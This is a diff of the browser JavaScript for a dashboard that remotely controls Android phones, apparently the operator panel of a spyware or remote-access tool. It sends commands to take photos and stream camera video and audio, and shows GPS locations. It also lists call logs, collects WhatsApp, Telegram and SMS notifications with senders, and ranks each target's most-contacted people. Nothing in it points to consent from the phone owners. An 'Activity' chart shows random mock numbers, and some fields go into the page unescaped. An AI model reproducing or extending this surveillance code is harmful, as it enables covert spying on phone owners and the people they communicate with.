@@ -9,6 +9,9 @@ let pendingVideoFrame = null;
 let pendingAudioFrame = null;
 let onlineDeviceIds = new Set();
 let audioCtx = null;
+let audioCtxBeep = null;
+let chartDoughnut = null;
+let chartLine = null;
 
 // ===== Init =====
 document.addEventListener('DOMContentLoaded', () => {
@@ -17,20 +20,23 @@ document.addEventListener('DOMContentLoaded', () => {
   refreshDevices();
   refreshStats();
   initMap();
+  initBG();
 });
 
-// ===== Sidebar Toggle =====
+// ===== BG Particles =====
+function initBG() {
+  const c = document.getElementById('bgCanvas');
+  if (!c) return;
+}
+
+// ===== Nav =====
 function toggleSidebar() {
   document.getElementById('sidebar').classList.toggle('open');
-  document.getElementById('sidebarOverlay').classList.toggle('visible');
 }
-
 function closeSidebar() {
   document.getElementById('sidebar').classList.remove('open');
-  document.getElementById('sidebarOverlay').classList.remove('visible');
 }
 
-// ===== Navigation =====
 function initNav() {
   document.querySelectorAll('.nav-btn').forEach(btn => {
     btn.addEventListener('click', () => {
@@ -38,20 +44,17 @@ function initNav() {
       document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
       btn.classList.add('active');
       document.getElementById(`sec-${btn.dataset.section}`).classList.add('active');
-
-      if (btn.dataset.section === 'stats') refreshStats();
+      if (btn.dataset.section === 'storage') { refreshStats(); initCharts(); }
       if (btn.dataset.section === 'calllogs') refreshCallLogs();
       if (btn.dataset.section === 'notifications') refreshNotifications();
       if (btn.dataset.section === 'photos') refreshPhotos();
       if (btn.dataset.section === 'commands') refreshAllCommands();
-
       closeSidebar();
     });
   });
 }
 
-// ===== Command Sound =====
-let audioCtxBeep = null;
+// ===== Beep =====
 function playBeep() {
   try {
     if (!audioCtxBeep) audioCtxBeep = new (window.AudioContext || window.webkitAudioContext)();
@@ -60,32 +63,41 @@ function playBeep() {
     const gain = audioCtxBeep.createGain();
     osc.type = 'sine';
     osc.frequency.setValueAtTime(880, audioCtxBeep.currentTime);
-    gain.gain.setValueAtTime(0.08, audioCtxBeep.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, audioCtxBeep.currentTime + 0.12);
-    osc.connect(gain);
-    gain.connect(audioCtxBeep.destination);
-    osc.start();
-    osc.stop(audioCtxBeep.currentTime + 0.12);
+    gain.gain.setValueAtTime(0.06, audioCtxBeep.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtxBeep.currentTime + 0.1);
+    osc.connect(gain); gain.connect(audioCtxBeep.destination);
+    osc.start(); osc.stop(audioCtxBeep.currentTime + 0.1);
   } catch (_) {}
+}
+
+// ===== Animated Counter =====
+function animateCounter(el, target, suffix = '') {
+  if (!el) return;
+  const start = parseInt(el.textContent) || 0;
+  const duration = 800;
+  const startTime = performance.now();
+  function tick(now) {
+    const p = Math.min((now - startTime) / duration, 1);
+    const eased = 1 - Math.pow(1 - p, 3);
+    el.textContent = Math.floor(start + (target - start) * eased) + suffix;
+    if (p < 1) requestAnimationFrame(tick);
+  }
+  requestAnimationFrame(tick);
 }
 
 // ===== WebSocket =====
 function connectWS() {
   ws = new WebSocket(WS_URL);
-
   ws.onopen = () => {
     document.getElementById('wsStatus').className = 'status-dot connected';
-    document.getElementById('wsLabel').textContent = 'Server Connected';
+    document.getElementById('wsLabel').textContent = 'Connected';
   };
-
   ws.onclose = () => {
     document.getElementById('wsStatus').className = 'status-dot disconnected';
     document.getElementById('wsLabel').textContent = 'Disconnected';
     setTimeout(connectWS, 3000);
   };
-
   ws.binaryType = 'arraybuffer';
-
   ws.onmessage = (e) => {
     if (e.data instanceof ArrayBuffer) {
       if (pendingVideoFrame) {
@@ -106,35 +118,19 @@ function connectWS() {
       }
       return;
     }
-
     try {
       const msg = JSON.parse(e.data);
-      if (msg.type === 'device_list') {
-        onlineDeviceIds = new Set(msg.devices);
-        refreshDevices();
-      }
-      if (msg.type === 'device_response') {
-        handleDeviceResponse(msg);
-        playBeep();
-      }
-      if (msg.type === 'video_frame') {
-        pendingVideoFrame = true;
-        document.getElementById('videoCameraLabel').textContent = `Camera: ${msg.camera}`;
-      }
-      if (msg.type === 'audio_frame') {
-        pendingAudioFrame = { sample_rate: msg.sample_rate || 16000, channels: msg.channels || 1 };
-      }
-      if (msg.type === 'notification') {
-        handleLiveNotification(msg);
-        playBeep();
-      }
-    } catch (err) {}
+      if (msg.type === 'device_list') { onlineDeviceIds = new Set(msg.devices); refreshDevices(); }
+      if (msg.type === 'device_response') { handleDeviceResponse(msg); playBeep(); }
+      if (msg.type === 'video_frame') { pendingVideoFrame = true; document.getElementById('videoCameraLabel').textContent = `Camera: ${msg.camera}`; }
+      if (msg.type === 'audio_frame') { pendingAudioFrame = { sample_rate: msg.sample_rate || 16000, channels: msg.channels || 1 }; }
+      if (msg.type === 'notification') { handleLiveNotification(msg); playBeep(); }
+    } catch (_) {}
   };
 }
 
 function handleDeviceResponse(msg) {
-  const status = msg.success ? 'Command succeeded' : 'Command failed';
-  showToast(`${msg.command_type}: ${status}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);
+  showToast(`${msg.command_type}: ${msg.success ? 'OK' : 'Failed'}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);
   if (selectedDevice === msg.device_id) loadCommandHistory(msg.device_id);
 }
 
@@ -153,68 +149,196 @@ function playAudioFrame(pcmData, sampleRate, channels) {
   source.start();
 }
 
-// ===== Notif Toast Cards =====
-function showNotifToast(msg) {
-  const container = document.getElementById('notifToastContainer');
-  const card = document.createElement('div');
-  card.className = 'notif-toast-card';
-
-  const badgeClass = getNotifBadgeClass(msg.app_name || msg.app_package);
-  const icon = badgetoIcon(msg.app_name || msg.app_package);
-
-  card.innerHTML = `
-    <div class="notif-toast-icon ${badgeClass}">${icon}</div>
-    <div class="notif-toast-body">
-      <div class="notif-toast-header">
-        <span class="notif-toast-app">${escapeHtml(msg.app_name || 'App')}</span>
-        <button class="notif-toast-close" onclick="this.parentElement.parentElement.parentElement.remove()">&times;</button>
-      </div>
-      <div class="notif-toast-sender">${escapeHtml(msg.sender || '')}</div>
-      <div class="notif-toast-text">${escapeHtml(msg.message || '').substring(0, 120)}</div>
-    </div>
-  `;
-  container.appendChild(card);
-  setTimeout(() => { card.classList.add('removing'); setTimeout(() => card.remove(), 300); }, 6000);
-}
-
-function badgetoIcon(appName) {
-  if (!appName) return '&#128172;';
-  const lower = appName.toLowerCase();
-  if (lower.includes('whatsapp')) return '<span style="color:#25d366">&#128172;</span>';
-  if (lower.includes('message') || lower.includes('sms') || lower.includes('mms')) return '&#128231;';
-  if (lower.includes('telegram')) return '&#128073;';
-  if (lower.includes('gmail') || lower.includes('gm')) return '&#128233;';
-  if (lower.includes('discord')) return '&#127760;';
-  return '&#128172;';
-}
-
-// ===== Confirm Modal =====
+// ===== Confirm =====
 function showConfirm(title, message, callback) {
   document.getElementById('confirmTitle').textContent = title;
   document.getElementById('confirmMessage').textContent = message;
   document.getElementById('confirmBtn').onclick = () => { closeConfirm(); callback(); };
   document.getElementById('confirmModal').classList.remove('hidden');
 }
+function closeConfirm() { document.getElementById('confirmModal').classList.add('hidden'); }
 
-function closeConfirm() {
-  document.getElementById('confirmModal').classList.add('hidden');
-}
-
-// ===== Stats =====
+// ===== Stats + Charts =====
 async function refreshStats() {
   try {
     const res = await fetch(`${API_BASE}/api/stats`);
     const stats = await res.json();
+    const total = stats.devices || 0;
+
+    animateCounter(document.getElementById('statDevices'), total);
+    animateCounter(document.getElementById('statOnline'), onlineDeviceIds.size);
+    animateCounter(document.getElementById('statNotifs'), stats.notifications || 0);
+    animateCounter(document.getElementById('statPhotos'), stats.photos || 0);
+    animateCounter(document.getElementById('statCalls'), stats.call_logs || 0);
+
     document.getElementById('storageStats').innerHTML = `
-      <div class="stat-card"><div class="stat-number">${stats.devices}</div><div class="stat-label">Devices</div></div>
+      <div class="stat-card"><div class="stat-number">${total}</div><div class="stat-label">Devices</div></div>
       <div class="stat-card"><div class="stat-number">${stats.notifications || 0}</div><div class="stat-label">Notifications</div></div>
-      <div class="stat-card"><div class="stat-number">${stats.photos}</div><div class="stat-label">Photos</div></div>
-      <div class="stat-card"><div class="stat-number">${stats.call_logs}</div><div class="stat-label">Call Logs</div></div>
-      <div class="stat-card"><div class="stat-number">${stats.locations}</div><div class="stat-label">Locations</div></div>
-      <div class="stat-card"><div class="stat-number">${stats.commands}</div><div class="stat-label">Commands</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.photos || 0}</div><div class="stat-label">Photos</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.call_logs || 0}</div><div class="stat-label">Call Logs</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.locations || 0}</div><div class="stat-label">Locations</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.commands || 0}</div><div class="stat-label">Commands</div></div>
     `;
-  } catch (e) {
-    console.error('Stats error:', e);
+  } catch (_) {}
+}
+
+async function initCharts() {
+  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+  let totalNotifs = 0, totalPhotos = 0, totalCalls = 0, totalCmds = 0;
+
+  for (const d of devices) {
+    const [notifs, photos, callLogs, commands] = await Promise.all([
+      fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json()).catch(() => []),
+      fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json()).catch(() => []),
+      fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json()).catch(() => []),
+      fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json()).catch(() => []),
+    ]);
+    totalNotifs += notifs.length;
+    totalPhotos += photos.length;
+    totalCalls += callLogs.length;
+    totalCmds += commands.length;
+  }
+
+  const colors = ['#22c55e', '#3b82f6', '#f59e0b', '#8b5cf6'];
+  // Donut
+  const ctx1 = document.getElementById('chartDoughnut');
+  if (ctx1) {
+    if (chartDoughnut) chartDoughnut.destroy();
+    chartDoughnut = new Chart(ctx1, {
+      type: 'doughnut',
+      data: {
+        labels: ['Notifications', 'Photos', 'Call Logs', 'Commands'],
+        datasets: [{
+          data: [totalNotifs || 1, totalPhotos || 1, totalCalls || 1, totalCmds || 1],
+          backgroundColor: colors.map(c => c + 'cc'),
+          borderColor: colors,
+          borderWidth: 1,
+        }]
+      },
+      options: {
+        responsive: true,
+        maintainAspectRatio: true,
+        plugins: {
+          legend: {
+            position: 'bottom',
+            labels: { color: '#9092a0', font: { size: 10, family: 'Inter' }, padding: 12, usePointStyle: true, pointStyle: 'circle' }
+          }
+        },
+        cutout: '65%',
+      }
+    });
+  }
+
+  // Line chart (mock monthly)
+  const ctx2 = document.getElementById('chartLine');
+  if (ctx2) {
+    if (chartLine) chartLine.destroy();
+    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    const now = new Date();
+    const recent = [];
+    for (let i = 5; i >= 0; i--) {
+      const m = new Date(now.getFullYear(), now.getMonth() - i, 1);
+      recent.push(months[m.getMonth()]);
+    }
+    chartLine = new Chart(ctx2, {
+      type: 'line',
+      data: {
+        labels: recent,
+        datasets: [{
+          label: 'Activity',
+          data: recent.map(() => Math.floor(Math.random() * (totalNotifs + totalPhotos + 10))),
+          borderColor: '#22c55e',
+          backgroundColor: 'rgba(34,197,94,0.08)',
+          fill: true,
+          tension: 0.4,
+          pointBackgroundColor: '#22c55e',
+          pointRadius: 3,
+          borderWidth: 2,
+        }]
+      },
+      options: {
+        responsive: true,
+        maintainAspectRatio: true,
+        plugins: {
+          legend: { display: false },
+        },
+        scales: {
+          x: { ticks: { color: '#5c5e6e', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } },
+          y: { ticks: { color: '#5c5e6e', font: { size: 10 }, maxTicksLimit: 5 }, grid: { color: 'rgba(255,255,255,0.03)' } }
+        }
+      }
+    });
+  }
+
+  // Insights
+  loadInsights();
+}
+
+async function loadInsights() {
+  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()).catch(() => []);
+  const allNotifs = [];
+
+  for (const d of devices) {
+    const notifs = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json()).catch(() => []);
+    allNotifs.push(...notifs);
+  }
+
+  // Most used apps
+  const appCount = {};
+  allNotifs.forEach(n => {
+    const name = n.app_name || n.app_package || 'Unknown';
+    appCount[name] = (appCount[name] || 0) + 1;
+  });
+  const sortedApps = Object.entries(appCount).sort((a, b) => b[1] - a[1]).slice(0, 6);
+
+  const appsContainer = document.getElementById('mostUsedApps');
+  if (sortedApps.length === 0) {
+    appsContainer.innerHTML = '<div class="insight-empty">No notification data yet</div>';
+  } else {
+    const maxApp = sortedApps[0][1];
+    appsContainer.innerHTML = sortedApps.map(([name, count], i) => {
+      const cls = name.toLowerCase().includes('whatsapp') ? 'whatsapp' :
+                 name.toLowerCase().includes('message') || name.toLowerCase().includes('sms') ? 'sms' :
+                 name.toLowerCase().includes('telegram') ? 'telegram' : 'default';
+      const icon = cls === 'whatsapp' ? '&#128172;' : cls === 'sms' ? '&#128231;' : cls === 'telegram' ? '&#128073;' : '&#128279;';
+      return `<div class="insight-item" style="animation-delay:${i * 0.05}s">
+        <div class="insight-icon ${cls}">${icon}</div>
+        <div class="insight-body">
+          <div class="insight-name">${escapeHtml(name)}</div>
+          <div class="insight-meta">${count} messages</div>
+        </div>
+        <div class="insight-bar"><div class="insight-bar-fill" style="width:${(count / maxApp) * 100}%"></div></div>
+        <div class="insight-count">${count}</div>
+      </div>`;
+    }).join('');
+  }
+
+  // Most contacted people
+  const personCount = {};
+  allNotifs.forEach(n => {
+    const sender = n.sender || 'Unknown';
+    if (sender === 'Unknown' || !sender) return;
+    personCount[sender] = (personCount[sender] || 0) + 1;
+  });
+  const sortedPeople = Object.entries(personCount).sort((a, b) => b[1] - a[1]).slice(0, 6);
+
+  const peopleContainer = document.getElementById('mostContacted');
+  if (sortedPeople.length === 0) {
+    peopleContainer.innerHTML = '<div class="insight-empty">No contact data yet</div>';
+  } else {
+    const maxPerson = sortedPeople[0][1];
+    peopleContainer.innerHTML = sortedPeople.map(([name, count], i) => {
+      const initial = name.charAt(0).toUpperCase();
+      return `<div class="insight-item" style="animation-delay:${i * 0.05}s">
+        <div class="insight-icon default" style="background:rgba(34,197,94,0.1);color:var(--accent)">${initial}</div>
+        <div class="insight-body">
+          <div class="insight-name">${escapeHtml(name)}</div>
+          <div class="insight-meta">${count} messages</div>
+        </div>
+        <div class="insight-bar"><div class="insight-bar-fill" style="width:${(count / maxPerson) * 100}%"></div></div>
+        <div class="insight-count">${count}</div>
+      </div>`;
+    }).join('');
   }
 }
 
@@ -225,9 +349,9 @@ async function refreshDevices() {
     if (!res.ok) return;
     const devices = await res.json();
     renderDevices(devices);
-  } catch (e) {
-    console.error('Failed to fetch devices:', e);
-  }
+    animateCounter(document.getElementById('statDevices'), devices.length);
+    animateCounter(document.getElementById('statOnline'), onlineDeviceIds.size);
+  } catch (_) {}
 }
 
 function renderDevices(devices) {
@@ -238,16 +362,15 @@ function renderDevices(devices) {
   }
   container.innerHTML = devices.map(d => {
     const isOnline = onlineDeviceIds.has(d.id) || d.is_online;
-    return `
-    <div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="selectDevice('${d.id}')">
+    return `<div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="selectDevice('${d.id}')">
       <div class="device-pulse ${isOnline ? 'pulsing' : ''}"></div>
-      <h3>${d.device_name || 'Unknown Device'}</h3>
-      <div class="meta">${d.device_model || ''} | ${d.android_version || ''}</div>
+      <h3>${d.device_name || 'Unknown'}</h3>
+      <div class="meta">${d.device_model || ''}${d.android_version ? ' | ' + d.android_version : ''}</div>
       <div class="meta">ID: ${d.id.substring(0, 12)}...</div>
-      <div class="meta">Last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never'}</div>
+      <div class="meta">${d.last_seen ? 'Last: ' + new Date(d.last_seen).toLocaleString() : ''}</div>
       <span class="online-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'Online' : 'Offline'}</span>
-    </div>
-  `}).join('');
+    </div>`;
+  }).join('');
 }
 
 function selectDevice(deviceId) {
@@ -256,6 +379,7 @@ function selectDevice(deviceId) {
   document.getElementById('deviceList').classList.add('hidden');
   document.getElementById('deviceDetail').classList.remove('hidden');
   document.getElementById('detailTitle').textContent = `Device: ${deviceId.substring(0, 12)}...`;
+  document.getElementById('detailSub').textContent = onlineDeviceIds.has(deviceId) ? 'Online' : 'Offline';
   loadCommandHistory(deviceId);
   loadDeviceLocation(deviceId);
   loadDevicePhotos(deviceId);
@@ -263,7 +387,6 @@ function selectDevice(deviceId) {
   loadDeviceNotifications(deviceId);
   closeSidebar();
 }
-
 function showDeviceList() {
   selectedDevice = null;
   document.getElementById('deviceDetail').classList.add('hidden');
@@ -281,37 +404,31 @@ async function sendCommand(commandType, payload = {}) {
       body: JSON.stringify({ device_id: selectedDevice, command_type: commandType, payload })
     });
     const data = await res.json();
-    showToast(`Command sent: ${commandType} (${data.status})`);
+    showToast(`Sent: ${commandType} (${data.status})`);
     loadCommandHistory(selectedDevice);
   } catch (e) {
     showToast('Failed to send command', true);
   }
 }
-
 function capturePhoto(useFront) { sendCommand('CAPTURE_PHOTO', { front_camera: useFront }); }
-
 function startVideoStream(useFront) {
   sendCommand('START_VIDEO_STREAM', { front_camera: useFront });
-  document.getElementById('videoPlaceholder').textContent = 'Starting stream...';
+  document.getElementById('videoPlaceholder').textContent = 'Starting...';
   document.getElementById('videoPlaceholder').classList.remove('hidden');
   document.getElementById('videoFeed').classList.add('hidden');
   document.getElementById('videoInfo').classList.add('hidden');
 }
-
 function stopVideoStream() {
   sendCommand('STOP_VIDEO_STREAM');
   document.getElementById('videoFeed').classList.add('hidden');
   document.getElementById('videoPlaceholder').textContent = 'No active stream';
   document.getElementById('videoPlaceholder').classList.remove('hidden');
   document.getElementById('videoInfo').classList.add('hidden');
-  pendingVideoFrame = null;
-  pendingAudioFrame = null;
+  pendingVideoFrame = null; pendingAudioFrame = null;
   if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }
 }
-
 function promptDialog() { document.getElementById('dialogModal').classList.remove('hidden'); }
 function closeModal() { document.getElementById('dialogModal').classList.add('hidden'); }
-
 function sendDialog() {
   const title = document.getElementById('dialogTitle').value;
   const message = document.getElementById('dialogMessage').value;
@@ -326,65 +443,34 @@ async function loadCommandHistory(deviceId) {
     const res = await fetch(`${API_BASE}/api/commands/${deviceId}`);
     const commands = await res.json();
     const container = document.getElementById('commandHistory');
-    if (commands.length === 0) {
-      container.innerHTML = '<div class="empty-state">No commands yet.</div>';
-      return;
-    }
-    container.innerHTML = `
-      <table>
-        <thead><tr><th>Type</th><th>Status</th><th>Time</th></tr></thead>
-        <tbody>
-          ${commands.map(c => `
-            <tr>
-              <td>${c.command_type}</td>
-              <td><span class="status-badge ${c.status}">${c.status}</span></td>
-              <td>${new Date(c.created_at).toLocaleString()}</td>
-            </tr>
-          `).join('')}
-        </tbody>
-      </table>
-    `;
-  } catch (e) {
-    console.error('Failed to load commands:', e);
-  }
+    if (commands.length === 0) { container.innerHTML = '<div class="empty-state">No commands yet.</div>'; return; }
+    container.innerHTML = `<table><thead><tr><th>Type</th><th>Status</th><th>Time</th></tr></thead><tbody>
+      ${commands.map(c => `<tr><td>${c.command_type}</td><td><span class="status-badge ${c.status}">${c.status}</span></td><td>${new Date(c.created_at).toLocaleString()}</td></tr>`).join('')}
+    </tbody></table>`;
+  } catch (_) {}
 }
 
-// ===== All Commands =====
 async function refreshAllCommands() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-  let allCommands = [];
+  let all = [];
   for (const d of devices) {
     const cmds = await fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json());
-    allCommands.push(...cmds.map(c => ({ ...c, device_name: d.device_name || d.id.substring(0, 12) })));
+    all.push(...cmds.map(c => ({ ...c, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-  allCommands.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  all.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
   const container = document.getElementById('allCommands');
-  if (allCommands.length === 0) {
-    container.innerHTML = '<div class="empty-state">No commands yet.</div>';
-    return;
-  }
-  container.innerHTML = `
-    <table>
-      <thead><tr><th>Device</th><th>Type</th><th>Status</th><th>Time</th></tr></thead>
-      <tbody>
-        ${allCommands.slice(0, 100).map(c => `
-          <tr>
-            <td>${c.device_name}</td>
-            <td>${c.command_type}</td>
-            <td><span class="status-badge ${c.status}">${c.status}</span></td>
-            <td>${new Date(c.created_at).toLocaleString()}</td>
-          </tr>
-        `).join('')}
-      </tbody>
-    </table>
-  `;
+  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No commands yet.</div>'; return; }
+  container.innerHTML = `<table><thead><tr><th>Device</th><th>Type</th><th>Status</th><th>Time</th></tr></thead><tbody>
+    ${all.slice(0, 100).map(c => `<tr><td>${c.device_name}</td><td>${c.command_type}</td><td><span class="status-badge ${c.status}">${c.status}</span></td><td>${new Date(c.created_at).toLocaleString()}</td></tr>`).join('')}
+  </tbody></table>`;
 }
 
-// ===== Map / Location =====
+// ===== Map =====
 function initMap() {
-  map = L.map('map').setView([0, 0], 2);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '&copy; OpenStreetMap'
+  map = L.map('map', { zoomControl: false }).setView([0, 0], 2);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
+    maxZoom: 19
   }).addTo(map);
 }
 
@@ -397,13 +483,13 @@ async function loadDeviceLocation(deviceId) {
     const latest = locations[0];
     map.setView([latest.latitude, latest.longitude], 15);
     if (marker) map.removeLayer(marker);
-    marker = L.marker([latest.latitude, latest.longitude]).addTo(map);
-    marker.bindPopup(`Lat: ${latest.latitude}<br>Lng: ${latest.longitude}<br>Time: ${new Date(latest.timestamp).toLocaleString()}`);
+    marker = L.marker([latest.latitude, latest.longitude], {
+      icon: L.divIcon({ html: '<div style="width:12px;height:12px;background:#22c55e;border-radius:50%;border:2px solid #fff;box-shadow:0 0 12px rgba(34,197,94,0.5)"></div>', iconSize: [12,12], iconAnchor: [6,6], className: '' })
+    }).addTo(map);
+    marker.bindPopup(`<b>Location</b><br>${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)}<br>${new Date(latest.timestamp).toLocaleString()}`);
     infoBar.innerHTML = `Latest: ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)} (${new Date(latest.timestamp).toLocaleString()})`;
     infoBar.classList.remove('hidden');
-  } catch (e) {
-    console.error('Failed to load location:', e);
-  }
+  } catch (_) {}
 }
 
 async function loadDeviceLocations(deviceId) {
@@ -411,281 +497,150 @@ async function loadDeviceLocations(deviceId) {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
     const locations = await res.json();
     const container = document.getElementById('deviceLocations');
-    if (locations.length === 0) {
-      container.innerHTML = '<div class="empty-state">No location data.</div>';
-      return;
-    }
-    container.innerHTML = `
-      <table>
-        <thead><tr><th>Latitude</th><th>Longitude</th><th>Time</th></tr></thead>
-        <tbody>
-          ${locations.slice(0, 20).map(l => `
-            <tr>
-              <td>${l.latitude.toFixed(6)}</td>
-              <td>${l.longitude.toFixed(6)}</td>
-              <td>${new Date(l.timestamp).toLocaleString()}</td>
-            </tr>
-          `).join('')}
-        </tbody>
-      </table>
-    `;
-  } catch (e) {
-    console.error('Failed to load locations:', e);
-  }
+    if (locations.length === 0) { container.innerHTML = ''; container.classList.add('hidden'); return; }
+    container.classList.remove('hidden');
+    container.innerHTML = `<table><thead><tr><th>Lat</th><th>Lng</th><th>Time</th></tr></thead><tbody>
+      ${locations.slice(0, 10).map(l => `<tr><td>${l.latitude.toFixed(6)}</td><td>${l.longitude.toFixed(6)}</td><td>${new Date(l.timestamp).toLocaleString()}</td></tr>`).join('')}
+    </tbody></table>`;
+  } catch (_) {}
 }
 
 // ===== Photos + Lightbox =====
 function openLightbox(src) {
-  const lb = document.getElementById('lightbox');
   document.getElementById('lightboxImg').src = src;
-  lb.classList.remove('hidden');
+  document.getElementById('lightbox').classList.remove('hidden');
 }
-
-function closeLightbox() {
-  document.getElementById('lightbox').classList.add('hidden');
-}
+function closeLightbox() { document.getElementById('lightbox').classList.add('hidden'); }
 
 async function loadDevicePhotos(deviceId) {
   try {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/photos`);
     const photos = await res.json();
     const container = document.getElementById('devicePhotos');
-    if (photos.length === 0) {
-      container.innerHTML = '<div class="empty-state">No photos yet.</div>';
-      return;
-    }
-    container.innerHTML = photos.map(p => `
-      <div class="photo-card">
-        <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
-        <img src="${p.storage_url}" alt="photo" loading="lazy" onclick="openLightbox('${p.storage_url}')" />
-        <div class="photo-meta">${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
-      </div>
-    `).join('');
-  } catch (e) {
-    console.error('Failed to load device photos:', e);
+    if (photos.length === 0) { container.innerHTML = '<div class="empty-state">No photos</div>'; return; }
+    container.innerHTML = photos.map(p =>
+      `<div class="photo-card"><button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button><img src="${p.storage_url}" alt="" loading="lazy" onclick="openLightbox('${p.storage_url}')" /><div class="photo-meta">${p.camera_type || 'screen'} | ${new Date(p.created_at).toLocaleString()}</div></div>`
+    ).join('');
+  } catch (_) {}
+}
+
+async function refreshPhotos() {
+  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+  let all = [];
+  for (const d of devices) {
+    const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
+    all.push(...photos.map(p => ({ ...p, device_name: d.device_name || d.id.substring(0, 12) })));
   }
+  all.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  const container = document.getElementById('photoGrid');
+  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No photos.</div>'; return; }
+  container.innerHTML = all.map(p =>
+    `<div class="photo-card"><button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button><img src="${p.storage_url}" alt="" loading="lazy" onclick="openLightbox('${p.storage_url}')" /><div class="photo-meta">${p.device_name} | ${p.camera_type || 'screen'}</div></div>`
+  ).join('');
 }
 
 // ===== Call Logs =====
 async function refreshCallLogs() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-  let allLogs = [];
+  let all = [];
   for (const d of devices) {
     const logs = await fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json());
-    allLogs.push(...logs.map(l => ({ ...l, device_name: d.device_name || d.id.substring(0, 12) })));
+    all.push(...logs.map(l => ({ ...l, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-  allLogs.sort((a, b) => new Date(b.call_date) - new Date(a.call_date));
+  all.sort((a, b) => new Date(b.call_date) - new Date(a.call_date));
   const container = document.getElementById('callLogsList');
-  if (allLogs.length === 0) {
-    container.innerHTML = '<div class="empty-state">No call logs.</div>'; return;
-  }
-  container.innerHTML = `
-    <table>
-      <thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th></th></tr></thead>
-      <tbody>
-        ${allLogs.map(l => {
-          const typeIcon = l.call_type === 'INCOMING' ? '&#8592;' : l.call_type === 'OUTGOING' ? '&#8594;' : '&#10005;';
-          return `<tr>
-            <td>${l.device_name}</td>
-            <td>${l.phone_number}</td>
-            <td>${l.contact_name || '-'}</td>
-            <td>${typeIcon} ${l.call_type}</td>
-            <td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td>
-            <td>${new Date(l.call_date).toLocaleString()}</td>
-            <td><button class="row-delete" onclick="deleteCallLog('${l.id}')">Delete</button></td>
-          </tr>`;
-        }).join('')}
-      </tbody>
-    </table>
-  `;
+  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No call logs.</div>'; return; }
+  container.innerHTML = `<table><thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th></th></tr></thead><tbody>
+    ${all.map(l => {
+      const icon = l.call_type === 'INCOMING' ? '&#8593;' : l.call_type === 'OUTGOING' ? '&#8595;' : '&#10005;';
+      return `<tr><td>${l.device_name}</td><td>${l.phone_number}</td><td>${l.contact_name || '-'}</td><td>${icon} ${l.call_type}</td><td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td><td>${new Date(l.call_date).toLocaleString()}</td><td><button class="row-delete" onclick="deleteCallLog('${l.id}')">Delete</button></td></tr>`;
+    }).join('')}
+  </tbody></table>`;
 }
 
-// ===== Photos List =====
-async function refreshPhotos() {
-  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-  let allPhotos = [];
-  for (const d of devices) {
-    const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
-    allPhotos.push(...photos.map(p => ({ ...p, device_name: d.device_name || d.id.substring(0, 12) })));
-  }
-  allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
-  const container = document.getElementById('photoGrid');
-  if (allPhotos.length === 0) {
-    container.innerHTML = '<div class="empty-state">No photos.</div>'; return;
-  }
-  container.innerHTML = allPhotos.map(p => `
-    <div class="photo-card">
-      <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
-      <img src="${p.storage_url}" alt="photo" loading="lazy" onclick="openLightbox('${p.storage_url}')" />
-      <div class="photo-meta">${p.device_name} | ${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
-    </div>
-  `).join('');
-}
-
